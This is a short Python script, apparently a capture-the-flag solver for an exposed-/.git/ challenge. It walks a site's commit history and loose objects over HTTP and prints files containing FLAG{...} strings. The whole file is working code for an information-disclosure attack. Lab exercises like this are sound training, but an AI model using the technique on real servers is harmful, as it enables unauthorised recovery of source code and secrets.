#!/usr/bin/env python3
"""Minimal 'git-dumper'-style recovery over an exposed /.git/ (ByteBazaar #11a).

Walks the loose objects reachable from refs/heads/main over plain HTTP and prints
any file whose contents contain a FLAG{...}. Usage:

    python3 git_recon.py http://localhost:8080
"""
import re
import sys
import zlib
import urllib.request


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip("/")

    def fetch(path):
        return urllib.request.urlopen(f"{base}/{path}", timeout=10).read()

    def obj(sha):
        raw = fetch(f".git/objects/{sha[:2]}/{sha[2:]}")
        return zlib.decompress(raw)

    head = fetch(".git/refs/heads/main").decode().strip()
    seen, stack, found = set(), [head], []
    while stack:
        commit = stack.pop()
        if commit in seen:
            continue
        seen.add(commit)
        body = obj(commit).split(b"\x00", 1)[1].decode("latin1")
        tree = re.search(r"tree ([0-9a-f]{40})", body).group(1)
        stack += re.findall(r"parent ([0-9a-f]{40})", body)
        tb = obj(tree).split(b"\x00", 1)[1]
        i = 0
        while i < len(tb):
            sp = tb.index(b" ", i)
            ns = tb.index(b"\x00", sp)
            name = tb[sp + 1:ns].decode("latin1")
            sha = tb[ns + 1:ns + 21].hex()
            i = ns + 21
            try:
                m = re.search(rb"FLAG\{[^}]*\}", obj(sha))
                if m:
                    found.append((name, m.group().decode()))
            except Exception:
                pass
    for name, flag in found:
        print(f"{name}: {flag}")
    return 0 if found else 1


if __name__ == "__main__":
    sys.exit(main())
